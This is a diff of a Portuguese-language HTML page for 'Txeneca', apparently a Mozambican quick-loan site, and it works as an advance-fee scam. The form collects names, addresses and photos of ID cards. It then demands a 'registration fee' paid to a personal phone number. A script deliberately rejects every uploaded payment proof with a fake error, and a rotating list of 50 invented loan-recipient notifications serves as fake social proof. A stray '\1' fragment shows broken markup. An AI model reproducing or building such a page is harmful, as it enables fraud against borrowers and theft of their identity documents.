@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="pt">
 <head>
 <meta charset="utf-8"/>
@@ -91,173 +92,343 @@
       width: 90%; max-width: 600px; line-height: 1.4em; opacity: 0; transition: opacity 0.5s ease;
     }
     .notificacao.show { display:block; opacity:1; }
-  
-/* --- Grupos WhatsApp (CNK) --- */
-.grupos-whats {
-  max-width: 900px;
-  margin: 16px auto 24px auto;
-  background: #fff;
-  border-radius: 14px;
-  box-shadow: 0 3px 10px rgba(0,0,0,0.08);
-  border: 1px solid #ffe0cc;
-  padding: 18px 16px;
-}
-.grupos-whats h2 {
-  color: var(--laranja);
-  margin: 0 0 10px 0;
-  text-align: center;
-  font-size: 1.4rem;
-}
-.grupos-grid {
-  display: grid;
-  grid-template-columns: repeat(2, minmax(0,1fr));
-  gap: 10px;
-  margin-top: 10px;
-}
-@media (max-width: 520px){
-  .grupos-grid { grid-template-columns: 1fr; }
-}
-.grupo-card {
-  background: #fff7f0;
-  border: 2px solid var(--borda);
-  border-radius: 12px;
-  padding: 14px;
-  text-align: center;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.05);
-}
-.grupo-card h3 {
-  margin: 6px 0 10px 0;
-  color: var(--laranja);
-  font-size: 1.1rem;
-}
-.grupo-card p {
-  margin: 0 0 10px 0;
-  font-size: .95rem;
-  color: #333;
-}
-.grupo-card .btn-mini {
-  display:inline-block;
-  padding:10px 14px;
-  border-radius:10px;
-  background: var(--laranja);
-  color:#fff;
-  text-decoration:none;
-  font-weight:bold;
-  border:none;
-}
-.grupo-card .btn-mini:disabled {
-  opacity: .6;
-}
-.guia-cnk {
-  margin-top: 10px;
-  background: #fff;
-  border: 1px dashed #ffb07a;
-  border-radius: 10px;
-  padding: 10px 12px;
-  font-size: .95rem;
-  color:#6b3b00;
-}
-.etapas {
-  display:none;
-  margin-top:10px;
-}
-.etapa {
-  display:none;
-  background:#fff7f0;
-  border:1px solid #ffd7b3;
-  border-radius:10px;
-  padding:10px 12px;
-  margin-top:8px;
-}
-.etapa h4 { margin: 6px 0 10px 0; color: #d26000; }
-.etapa .btn-mini { margin-top: 6px; }
-
-
-/* --- Hero TXENECA (Landing WhatsApp) --- */
-.hero-landing {
-  background: linear-gradient(180deg, #ff8a33 0%, #ff6a00 100%);
-  padding: 28px 14px 34px 14px;
-}
-.hero-card {
-  max-width: 900px;
-  margin: 0 auto;
-  background: #fff;
-  border-radius: 22px;
-  padding: 22px 16px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-  text-align: center;
-}
-.hero-title {
-  color: #ffffff;
-  text-align: center;
-  font-weight: 800;
-  letter-spacing: 1px;
-  margin: 0 0 10px 0;
-  font-size: 2rem;
-}
-.hero-sub {
-  color: #ffeede;
-  text-align: center;
-  margin: 0 0 18px 0;
-  font-size: 1rem;
-}
-.hero-card h2 {
-  margin: 0 0 10px 0;
-  font-size: 1.4rem;
-  color: #333;
-}
-.hero-card p {
-  margin: 6px 0;
-  color: #444;
-  font-size: 1rem;
-  line-height: 1.5;
-}
-.btn-wrap { margin-top: 16px; display: grid; gap: 12px; max-width: 360px; margin-left: auto; margin-right: auto; }
-.btn-round {
-  display: block;
-  padding: 12px 18px;
-  border-radius: 999px;
-  background: var(--laranja);
-  color: #fff;
-  text-decoration: none;
-  font-weight: 800;
-  letter-spacing: .5px;
-  box-shadow: 0 10px 25px rgba(255,106,0,0.35);
-}
-.hero-foot {
-  text-align: center;
-  color: #fff;
-  opacity: .9;
-  margin-top: 12px;
-  font-size: .95rem;
-}
-
-</style>
-
-  <link rel="manifest" href="/manifest.webmanifest">
-  <meta name="mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-
+  </style>
 </head>
 <body>
 <header>
 <h1>Txeneca</h1>
 <p>Empréstimos rápidos e seguros para si</p>
 </header>
-<!-- === HERO LANDING TXENECA === -->
-<section class="hero-landing">
-  <h1 class="hero-title">TXENECA</h1>
-  <p class="hero-sub">Empreendimentos com apoio financeiro real</p>
-  <div class="hero-card">
-    <h2>Seja bem-vindo à Comunidade TXENECA! 🚀</h2>
-    <p>Solicite <strong>empréstimos de 6.000 MZN até 200.000 MZN</strong> de forma rápida, segura e 100% online.</p>
-    <p>Entre agora nos nossos grupos oficiais no WhatsApp para obter mais detalhes 👇</p>
-    <div class="btn-wrap">
-      <a class="btn-round" href="https://chat.whatsapp.com/LJRiECO7juSEZnSEFV11O5?mode=ems_copy_t" target="_blank" rel="noopener">TXENECA01</a>
-      <a class="btn-round" href="https://chat.whatsapp.com/I0tBO8SMF4u5mt6qSPCCWx?mode=ems_copy_t" target="_blank" rel="noopener">TXENECA02</a>
-    </div>
-  </div>
-  <div class="hero-foot">Protegemos seus dados. Suporte 24/7.</div>
+<!-- Notificações dinâmicas (V24) -->
+<main>
+<section style="text-align:center;margin:30px 0;"><h2 style="color:#ff6600;">Solicite Seu Empréstimo</h2><p>Preencha o formulário abaixo para iniciar seu pedido de empréstimo.</p></section>
+<!-- Hero do V27 -->
+<section>
+<h2>Empréstimos rápidos e seguros para si</h2>
+<p>Com a <strong>Txeneca</strong>, você tem acesso a <strong>empréstimos de 6.000 a 200.000 MZN</strong>, com aprovação rápida e condições transparentes.</p>
+<a class="btn" href="#solicitar" onclick="document.getElementById('solicitar').scrollIntoView({behavior:'smooth'})">📌 Solicitar Empréstimo</a>
+<a class="btn" href="https://wa.me/258864529395" target="_blank">📝 Regista-se</a>
 </section>
+<!-- Seção adicionada: Por que escolher a Txeneca -->
+<section id="porque-txeneca" style="text-align:center; margin:40px 0;">
+<h2 style="color:#ff6600;">Por que escolher a Txeneca?</h2>
+<p style="max-width:700px;margin:10px auto;font-size:1.1em;line-height:1.7em;color:#333;">
+        Oferecemos as melhores condições para o seu empréstimo com processos simples, rápidos e totalmente transparentes.
+        A <strong>Txeneca</strong> é uma plataforma confiável que analisa o seu pedido em até 8 minutos após o pagamento da taxa de inscrição.
+      </p>
+</section>
+<!-- Razões (V27) -->
+<div class="bloco">
+<div class="icone">🔒</div>
+<h3 style="text-align:center;">Segurança Garantida</h3>
+<p>Seus dados estão protegidos com os mais altos padrões de segurança.</p>
+</div>
+<div class="bloco">
+<div class="icone">💰</div>
+<h3 style="text-align:center;">Taxas Transparentes</h3>
+<p>Sem taxas ocultas ou surpresas desagradáveis. Tudo claro desde o início.</p>
+</div>
+<div class="bloco">
+<div class="icone">📝</div>
+<h3 style="text-align:center;">Processo Simples</h3>
+<p>Obtenha seu empréstimo em apenas alguns passos rápidos e seguros.</p>
+</div>
+<!-- SEÇÃO SOLICITAR: tudo do V24 aqui dentro -->
+<section id="solicitar">
+<h2>📊 Taxa de Inscrição &amp; Valor do Empréstimo</h2>
+<div class="quadrado">
+<h3>Valor do Empréstimo</h3>
+<p class="sub">Selecione o valor (MZN)</p>
+<input id="slider" max="10" min="1" step="1" type="range" value="1"/>
+<div class="ticks">
+<span>6.000 MZN</span>
+<span>100.000 MZN</span>
+<span>200.000 MZN</span>
+</div>
+<div class="sep"></div>
+<div class="output">
+<div class="linha" id="valor">Recebe: --</div>
+<div class="linha" id="taxa">Taxa de Inscrição: --</div>
+</div>
+</div>
+<div id="tabelaPrazo" style="margin-top:16px; padding:15px; border:1px solid #ccc; border-radius:10px; background:#f9f9f9; display:none; max-width:680px; margin-left:auto; margin-right:auto;">
+<h3 style="color:var(--laranja); text-align:center;">📅 Detalhes do Prazo</h3>
+<div id="conteudoPrazo" style="font-size:20px; font-weight:bold; color:#8B4513; line-height:1.8em; text-align:center; text-shadow:1px 1px 2px rgba(0,0,0,0.1);"></div>
+</div>
+<!-- FORMULÁRIO (V24) -->
+<section id="formulario">
+<div style="text-align:center;margin:20px 0 5px 0;"><h2 style="color:#ff6600;margin:0 0 6px 0;">Solicite Seu Empréstimo</h2><p style="margin:0;">Preencha o formulário abaixo para iniciar seu pedido de empréstimo.</p></div>
+<h2>📝 Formulário de Solicitação</h2>
+<form id="formSolicitacao">
+<label for="nome">👤 Nome Completo</label>
+<input id="nome" placeholder="Digite o seu nome" required="" type="text"/>
+<label for="telefone">📞 Telefone</label>
+<input id="telefone" placeholder="Digite o seu número" required="" type="tel"/>
+<label for="provincia">🌍 Província</label>
+<select id="provincia" required="">
+<option value="">-- SELECIONE A SUA PROVÍNCIA --</option>
+<option>Maputo</option><option>Inhambane</option><option>Nampula</option><option>Gaza</option>
+<option>Tete</option><option>Sofala (Beira)</option><option>Cabo Delgado</option>
+<option>Niassa</option><option>Manica</option><option>Zambézia</option>
+</select>
+<label for="setor">💼 Setor de Trabalho</label>
+<select id="setor" required="">
+<option value="">-- SELECIONE O SEU SETOR DE TRABALHO --</option>
+<option>Comércio</option><option>Agricultura</option><option>Conta Própria</option>
+<option>Construção Civil</option><option>Educação</option><option>Saúde</option><option>Transporte</option><option>Outros</option>
+</select>
+<label for="bairro">🏘️ Bairro</label>
+<input id="bairro" placeholder="Digite o seu bairro" required="" type="text"/>
+<label for="casa">🏠 Número da Casa</label>
+<input id="casa" placeholder="Ex: 23" required="" type="text"/>
+<label for="quarteirao">🛣️ Número do Quarteirão</label>
+<input id="quarteirao" placeholder="Ex: 12" required="" type="text"/>
+<label for="doc_frente">🆔 B.I (Frente)</label>
+<input accept="image/*" id="doc_frente" required="" type="file" accept="image/*" capture="camera"/>
+<label for="doc_verso">🆔 B.I (Verso)</label>
+<input accept="image/*" id="doc_verso" required="" type="file" accept="image/*" capture="camera"/>
+<button class="btn" id="btnEtapa1" style="margin-top:18px;" type="submit">📤 ENVIAR SOLICITAÇÃO</button>
+</form>
+</section>
+<!-- PAGAMENTO (V24) -->
+<section id="pagamento" style="display:none; margin-top:24px;">
+<h2>💳 Pagamento da Taxa de Inscrição</h2>
+<div class="taxa" style="text-align:center;">
+<p id="taxaEscolhida" style="font-size:1.4em; font-weight:bold; color:#000; margin:10px 0;">Taxa a pagar: --</p>
+<h3 style="margin:0; color:#d84315;">Numero para transferência de taxa</h3>
+<p style="font-size:1.6em; font-weight:bold; color:#333; margin:10px 0;">862159309</p>
+<p style="font-size:1.05em; color:brown; font-weight:bold; margin:5px 0;">Nome de confirmação</p>
+<p style="font-size:1.2em; color:brown; font-weight:bold; margin:5px 0;">Nelson Alexandre</p>
+<p style="font-size:1em; color:#2e7d32; font-weight:bold; margin:10px 0 0 0;">\1
+<p style="font-size:1.05em; background:#fff4e6; border-left:5px solid #ff6600; padding:10px 14px; border-radius:8px; color:#6b3b00; font-weight:bold; text-align:center; max-width:680px; margin:15px auto;">
+⏳ Após o pagamento de taxa aguarde durante os 8 minutos para receber o seu empréstimo</p>
+</p></div>
+<label for="numero-pagador" style="font-weight:bold;display:block;margin-top:20px;">Digite o número de pagamento:</label>
+<input id="numero-pagador" placeholder="Ex: 84xxxxxxx" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:10px;margin-top:6px;font-size:16px;" type="tel"/>
+<button class="btn" onclick="pagarTaxa()" style="background:#ff9800;" type="button">💸 Fazer Transferência da Taxa</button>
+<p style="font-size:18px;font-weight:bold;color:#333;margin-top:18px;">Depois de pagar a taxa envia imagem do comprovativo aqui:</p>
+<p style="color:#d35400;font-weight:bold;margin:0 0 8px 0;">🔽 Carregue o ficheiro abaixo</p>
+<input accept="image/*" id="comprovativo" name="comprovativo" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:10px;background:#fff;margin-top:6px;font-size:16px;" type="file"/>
+
+<div style="color:#666;font-size:0.95em;margin-bottom:8px;">JPG, PNG — tamanho recomendado até 10MB</div>
+<div style="background:transparent;padding:8px 12px;border-radius:8px;display:inline-block;color:#333;">Selecionar ficheiro</div>
+<input accept="image/*" id="comprovativo" name="comprovativo" style="opacity:0;position:absolute;left:-9999px;" type="file"/>
+
+
+
+<div id="erro-comprovativo" style="color:red;font-weight:bold;margin-top:8px;display:none;"></div>
+<button class="btn" id="btnFinalizar" style="margin-top:14px;" type="button">✅ Finalizar Envio</button>
+</section>
+</section>
+</main>
+
+<section id="sobre-txeneca" style="background:#fffaf5;border-top:3px solid #ff6600;padding:25px;border-radius:10px;margin-top:40px;">
+<h2 style="color:#ff6600;text-align:center;margin-top:0;">💼 Sobre a Txeneca</h2>
+<p style="font-size:1.05em;line-height:1.7em;text-align:justify;">
+    A <strong>Txeneca</strong> é uma plataforma digital especializada em <strong>empréstimos rápidos e seguros</strong>, criada para oferecer acesso financeiro simples e transparente
+    a todos os moçambicanos. Com tecnologia moderna e um sistema de aprovação eficiente, a Txeneca analisa cada pedido de forma <strong>confidencial, transparente e responsável</strong>,
+    garantindo que cada cliente receba a melhor opção de crédito conforme as suas necessidades.
+  </p>
+<h3 style="color:#e65c00;margin-top:25px;">🤝 Por que confiar na Txeneca</h3>
+<ul style="font-size:1.05em;line-height:1.8em;margin-left:20px;color:#333;">
+<li><strong>Transparência total:</strong> sem taxas escondidas – o cliente sabe exatamente quanto paga e quanto recebe.</li>
+<li><strong>Segurança de dados:</strong> proteção avançada das suas informações pessoais e financeiras.</li>
+<li><strong>Atendimento humano:</strong> equipa pronta para acompanhar em todas as etapas do processo.</li>
+<li><strong>Respostas rápidas:</strong> após o pagamento da taxa, a análise é concluída em até <strong>8 minutos</strong>.</li>
+<li><strong>Experiência comprovada:</strong> milhares de clientes já receberam com sucesso os seus empréstimos.</li>
+</ul>
+<div style="margin-top:25px;text-align:center;border-top:1px solid #ffcc99;padding-top:15px;">
+<h3 style="color:#ff6600;margin-bottom:8px;">📞 Contacto Oficial</h3>
+<p style="margin:4px 0;font-size:1.1em;color:#333;"><strong>Txeneca – Empréstimos Rápidos e Seguros</strong></p>
+<p style="margin:4px 0;">📍 Sede: Maputo – Moçambique</p>
+<p style="margin:4px 0;font-size:1.1em;font-weight:bold;color:#ff6600;">📱 +258 862 159 309</p>
+<p style="margin:4px 0;">✉️ atendimento@txeneca.co.mz</p>
+<p style="margin:4px 0;color:#444;">🕐 Segunda a Sábado, das 8h às 18h</p>
+</div>
+</section>
+<footer style="text-align:center; padding:15px; color:#777; font-size:.95em;">© 2025 Txeneca - Todos os direitos reservados.</footer>
+<!-- Scripts do V24 -->
+<script>
+    // Opções do slider (taxa x faixa recebida)
+    const opcoes = [
+      ["516 MT", "6.000 – 8.000 MT"],
+      ["1.099 MT", "12.000 – 15.000 MT"],
+      ["1.593 MT", "25.000 – 37.000 MT"],
+      ["1.703 MT", "50.000 – 64.000 MT"],
+      ["2.018 MT", "68.000 – 86.000 MT"],
+      ["2.105 MT", "87.000 – 100.000 MT"],
+      ["2.1503 MT", "120.000 – 135.000 MT"],
+      ["2.258 MT", "136.000 – 167.000 MT"],
+      ["2.509 MT", "168.000 – 189.000 MT"],
+      ["2.703 MT", "190.000 – 200.000 MT"]
+    ];
+
+    const tabelasPrazo = {
+      1: "📅 Prazo: 4 meses<br>• 6.000 MT ➡️ Paga 7.200 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 1.800 MT</span><br>• 8.000 MT ➡️ Paga 9.700 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 2.425 MT</span>",
+      2: "📅 Prazo: 5 meses<br>• 12.000 MT ➡️ Paga 14.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 2.800 MT</span><br>• 15.000 MT ➡️ Paga 17.500 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 3.500 MT</span>",
+      3: "📅 Prazo: 6 meses<br>• 25.000 MT ➡️ Paga 28.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 4.666 MT</span><br>• 37.000 MT ➡️ Paga 41.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 6.833 MT</span>",
+      4: "📅 Prazo: 7 meses<br>• 50.000 MT ➡️ Paga 54.100 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 7.728 MT</span><br>• 64.000 MT ➡️ Paga 69.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 9.857 MT</span>",
+      5: "📅 Prazo: 8 meses<br>• 68.000 MT ➡️ Paga 76.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 9.500 MT</span><br>• 86.000 MT ➡️ Paga 97.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 12.125 MT</span>",
+      6: "📅 Prazo: 9 meses<br>• 87.000 MT ➡️ Paga 97.100 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 10.789 MT</span><br>• 100.000 MT ➡️ Paga 115.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 12.778 MT</span>",
+      7: "📅 Prazo: 10 meses<br>• 120.000 MT ➡️ Paga 135.100 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 13.510 MT</span><br>• 135.000 MT ➡️ Paga 156.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 15.600 MT</span>",
+      8: "📅 Prazo: 11 meses<br>• 136.000 MT ➡️ Paga 156.100 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 14.191 MT</span><br>• 167.000 MT ➡️ Paga 194.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 17.636 MT</span>",
+      9: "📅 Prazo: 12 meses<br>• 168.000 MT ➡️ Paga 194.100 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 16.175 MT</span><br>• 189.000 MT ➡️ Paga 227.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 18.917 MT</span>",
+      10:"📅 Prazo: 13 meses<br>• 190.000 MT ➡️ Paga 227.100 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 17.469 MT</span><br>• 200.000 MT ➡️ Paga 230.000 MT<br><span style='color:#8B4513;font-weight:bold'>Mensal paga-se 17.692 MT</span>"
+    };
+
+    function atualizarSaidas() {
+      const slider = document.getElementById("slider");
+      const idx = parseInt(slider.value) - 1;
+      document.getElementById("valor").textContent = "Recebe: " + opcoes[idx][1];
+      document.getElementById("taxa").textContent  = "Taxa de Inscrição: " + opcoes[idx][0];
+
+      const taxaEscolhida = document.getElementById("taxaEscolhida");
+      if (taxaEscolhida) taxaEscolhida.textContent = "Taxa a pagar: " + opcoes[idx][0];
+
+      const tabelaPrazo = document.getElementById("tabelaPrazo");
+      const conteudoPrazo = document.getElementById("conteudoPrazo");
+      if (tabelasPrazo[slider.value]) {
+        tabelaPrazo.style.display = "block";
+        conteudoPrazo.innerHTML = tabelasPrazo[slider.value];
+      } else {
+        tabelaPrazo.style.display = "none";
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const slider = document.getElementById("slider");
+      slider.addEventListener("input", atualizarSaidas);
+      slider.addEventListener("change", atualizarSaidas);
+      atualizarSaidas();
+    });
+
+    // Após enviar o formulário, mostra a etapa de pagamento
+    document.getElementById("formSolicitacao").addEventListener("submit", function(e){
+      e.preventDefault();
+      document.getElementById("formulario").style.display="none";
+      document.getElementById("pagamento").style.display="block";
+      atualizarSaidas();
+      window.scrollTo({ top: document.getElementById('pagamento').offsetTop - 20, behavior: 'smooth'});
+    });
+
+    // Pagamento via USSD *898#
+    function pagarTaxa() {
+      const numero = document.getElementById("numero-pagador").value;
+      if (!numero) {
+        alert("⚠️ Por favor digite o seu número para prosseguir com o pagamento.");
+        return;
+      }
+      const ussd = "*898%23"; // *898#
+      window.location.href = "tel:" + ussd;
+    }
+    window.pagarTaxa = pagarTaxa;
+
+    // Ação do botão Finalizar Envio
+    document.getElementById("btnFinalizar").addEventListener("click", function () {
+      const comp = document.getElementById("comprovativo");
+      if (!comp || comp.files.length === 0) {
+        alert("⚠️ Envie comprovativo e volte a tentar");
+      } else {
+        alert("✅ Comprovativo enviado com sucesso!");
+      }
+    });
+
+    // Bloquear upload de comprovativo (como no V24)
+    (function(){
+      const comp = document.getElementById("comprovativo");
+      const erro = document.getElementById("erro-comprovativo");
+      if(comp){
+        comp.addEventListener("change", function(){
+          if(this.files && this.files.length > 0){
+            if (erro) {
+              erro.style.display = "block";
+              erro.innerText = "⚠️ Erro no comprovativo: confirme o pagamento e volte a tentar novamente";
+            }
+            alert("⚠️ Erro no comprovativo: confirme o pagamento e volte a tentar novamente");
+            this.value = ""; // Resetar input
+          }
+        });
+      }
+    })();
+
+    </script>
+<!-- Notificações rotativas (50 mensagens) -->
+<div aria-live="polite" class="notificacao" id="notificacao" role="status" style="position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:#000;
+  color:#fff;padding:14px 22px;border-radius:12px;display:none;z-index:2000;width:90%;
+  max-width:600px;line-height:1.4em;font-weight:bold;text-align:center;font-size:1.05em;">
+</div>
+<script>
+const mensagens = [
+  "✅ Transação concluída ✅ Ana Pedro de Maputo recebeu 37.000 MT",
+  "✅ Confirmação confirmada ✅ António André de Beira recebeu 50.000 MT",
+  "✅ Pagamento finalizado ✅ Marta José de Nampula recebeu 12.000 MT",
+  "✅ Transferência aprovada ✅ Luís Manuel de Tete recebeu 86.000 MT",
+  "✅ Operação realizada ✅ Fátima Langa de Quelimane recebeu 25.000 MT",
+  "✅ Transação concluída ✅ Joaquim Alfredo de Gaza recebeu 64.000 MT",
+  "✅ Confirmação confirmada ✅ Elsa Nhaca de Pemba recebeu 189.000 MT",
+  "✅ Pagamento finalizado ✅ Sérgio Mário de Chimoio recebeu 100.000 MT",
+  "✅ Transferência aprovada ✅ Carla Mucavele de Inhambane recebeu 15.000 MT",
+  "✅ Operação realizada ✅ João Manuel de Maputo recebeu 55.000 MT",
+  "✅ Transação concluída ✅ Daniel Muianga de Beira recebeu 62.000 MT",
+  "✅ Confirmação confirmada ✅ Rosa Jamila de Nampula recebeu 27.000 MT",
+  "✅ Pagamento finalizado ✅ Ernesto Paulo de Sofala recebeu 71.000 MT",
+  "✅ Transferência aprovada ✅ Patrícia Tomás de Maputo recebeu 40.000 MT",
+  "✅ Operação realizada ✅ Manuel Cossa de Tete recebeu 33.000 MT",
+  "✅ Transação concluída ✅ Isabel Nhantumbo de Quelimane recebeu 19.000 MT",
+  "✅ Confirmação confirmada ✅ Tomé Nunes de Gaza recebeu 96.000 MT",
+  "✅ Pagamento finalizado ✅ Sandra Ussene de Inhambane recebeu 120.000 MT",
+  "✅ Transferência aprovada ✅ Fernando Jorge de Beira recebeu 84.000 MT",
+  "✅ Operação realizada ✅ Helena António de Maputo recebeu 42.000 MT",
+  "✅ Transação concluída ✅ Pedro Simango de Nampula recebeu 23.000 MT",
+  "✅ Confirmação confirmada ✅ Lurdes Machava de Sofala recebeu 65.000 MT",
+  "✅ Pagamento finalizado ✅ Jorge Mussá de Tete recebeu 71.000 MT",
+  "✅ Transferência aprovada ✅ Carla Mário de Gaza recebeu 53.000 MT",
+  "✅ Operação realizada ✅ Sérgio Muianga de Maputo recebeu 38.000 MT",
+  "✅ Transação concluída ✅ Teresa Zeca de Beira recebeu 91.000 MT",
+  "✅ Confirmação confirmada ✅ António Muianga de Nampula recebeu 44.000 MT",
+  "✅ Pagamento finalizado ✅ Rosário João de Sofala recebeu 29.000 MT",
+  "✅ Transferência aprovada ✅ Mateus Uate de Inhambane recebeu 132.000 MT",
+  "✅ Operação realizada ✅ Graça Muiambo de Quelimane recebeu 47.000 MT",
+  "✅ Transação concluída ✅ José Massingue de Tete recebeu 88.000 MT",
+  "✅ Confirmação confirmada ✅ Alice Domingos de Maputo recebeu 61.000 MT",
+  "✅ Pagamento finalizado ✅ Gilberto Nhantumbo de Gaza recebeu 17.000 MT",
+  "✅ Transferência aprovada ✅ Sara Luís de Nampula recebeu 73.000 MT",
+  "✅ Operação realizada ✅ Amélia Zandamela de Sofala recebeu 26.000 MT",
+  "✅ Transação concluída ✅ Júlio Muandza de Beira recebeu 104.000 MT",
+  "✅ Confirmação confirmada ✅ Ivone Samuel de Inhambane recebeu 58.000 MT",
+  "✅ Pagamento finalizado ✅ Nelson Alexandre de Maputo recebeu 95.000 MT",
+  "✅ Transferência aprovada ✅ Dulce Tavares de Quelimane recebeu 31.000 MT",
+  "✅ Operação realizada ✅ Eugénio António de Tete recebeu 79.000 MT",
+  "✅ Transação concluída ✅ Cátia Nhavoto de Gaza recebeu 68.000 MT",
+  "✅ Confirmação confirmada ✅ Rui Sitoe de Beira recebeu 121.000 MT",
+  "✅ Pagamento finalizado ✅ Patrícia Langa de Nampula recebeu 36.000 MT",
+  "✅ Transferência aprovada ✅ Bruno Cossa de Sofala recebeu 112.000 MT",
+  "✅ Operação realizada ✅ Andreia Zeca de Maputo recebeu 90.000 MT",
+  "✅ Transação concluída ✅ Paulo Guambe de Tete recebeu 54.000 MT",
+  "✅ Confirmação confirmada ✅ Carla Tomé de Inhambane recebeu 41.000 MT",
+  "✅ Pagamento finalizado ✅ Sérgio Gimo de Quelimane recebeu 28.000 MT",
+  "✅ Transferência aprovada ✅ Joana Nhacale de Maputo recebeu 75.000 MT",
+  "✅ Operação realizada ✅ Ernesto Zeca de Beira recebeu 63.000 MT",
+  "✅ Transação concluída ✅ Ana Pedro de Maputo recebeu 37.000 MT (final)"
+];
+
+let indice = 0;
+function mostrarNotificacao() {
+  const box = document.getElementById("notificacao");
+  if (!box) return;
+  box.textContent = mensagens[indice];
+  box.style.display = "block";
+  box.style.opacity = 1;
+  setTimeout(() => {
+    box.style.opacity = 0;
+    setTimeout(() => { box.style.display = "none"; }, 1000);
+  }, 9000);
+  indice = (indice + 1) % mensagens.length;
+}
+// Mostrar a primeira imediatamente e depois a cada 20s
+mostrarNotificacao();
+setInterval(mostrarNotificacao, 20000);
+</script>
+<!-- Fim notificações -->
 </body>
 </html>
